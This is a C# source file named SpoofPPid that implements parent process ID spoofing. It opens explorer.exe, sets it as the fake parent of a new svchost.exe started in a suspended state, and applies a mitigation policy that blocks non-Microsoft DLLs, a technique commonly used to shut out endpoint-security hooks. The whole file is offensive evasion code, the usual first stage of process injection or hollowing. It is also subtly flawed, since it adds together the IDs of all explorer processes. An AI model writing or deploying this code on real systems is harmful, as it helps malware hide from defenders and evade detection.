using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SpoofPPid
{
    public class Class1 : Imports
    {
        static void RunSpoofing()
        {
            STARTUPINFOEX siex = new STARTUPINFOEX();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            var process = Process.GetProcessesByName("explorer");
            int parentProc = 0;
            foreach (var p in process)
            {
                parentProc += p.Id;
            }

            Console.WriteLine("[*] New Parent PID Found: {0}", parentProc);

            IntPtr procHandle = OpenProcess(ProcessAccessFlags.CreateProcess, false, parentProc);

            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);

            siex.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(siex.lpAttributeList, 2, 0, ref lpSize);

            IntPtr lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValueProc, procHandle);
            UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
            UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, lpMitigationPolicy, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            string app = @"C:\Windows\System32\svchost.exe";
            bool procinit = CreateProcess(app, null, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED | CreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref siex, ref pi);
            Console.WriteLine("[*] Process Created. Process ID: {0}", pi.dwProcessId);
            Console.ReadKey();
        }
    }
}